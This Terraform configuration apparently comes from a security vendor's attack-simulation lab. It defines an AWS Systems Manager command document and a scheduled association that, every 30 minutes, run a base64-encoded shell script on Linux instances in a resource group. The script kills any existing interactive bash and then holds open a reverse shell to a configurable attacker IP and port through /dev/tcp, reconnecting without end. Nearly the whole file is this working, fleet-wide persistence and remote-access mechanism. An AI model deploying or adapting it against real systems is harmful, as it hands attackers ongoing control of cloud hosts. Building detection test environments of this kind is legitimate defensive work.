locals {
    host_ip = var.host_ip
    host_port = var.host_port

    payload = <<-EOT
    truncate -s 0 /tmp/attacker_exec_reverseshell_target.log
    echo "Attacker Host: ${local.host_ip}:${local.host_port}" > /tmp/attacker_exec_reverseshell_target.log",
    kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')
    echo "Running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'" >> /tmp/attacker_exec_reverseshell_target.log
    while true; do
        while ! /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do
            echo "reconnecting..." >> /tmp/attacker_exec_reverseshell_target.log;
            sleep 10;
        done;
        echo "disconnected - wait retry..." >> /tmp/attacker_exec_reverseshell_target.log;
        sleep 60;
        echo "starting retry..." >> /tmp/attacker_exec_reverseshell_target.log;
    done
    EOT
    base64_payload = base64encode(local.payload)
}

resource "aws_ssm_document" "exec_reverse_shell_target" {
  name          = "exec_reverse_shell_target"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "exec reverse shell target",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "exec_reverse_shell_target",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "600",
                    "runCommand": [
                        "echo \"${local.base64_payload}\" > /tmp/payload",
                        "echo '${local.base64_payload}' | base64 -d | /bin/bash -"
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "exec_reverse_shell_target" {
    name = "exec_reverse_shell_target"

    resource_query {
        query = jsonencode(var.resource_query_exec_reverse_shell_target)
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "exec_reverse_shell_target" {
    association_name = "exec_reverse_shell_target"

    name = aws_ssm_document.exec_reverse_shell_target.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.exec_reverse_shell_target.name,
        ]
    }

    compliance_severity = "HIGH"

    # every 30 minutes
    schedule_expression = "cron(0/30 * * * ? *)"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}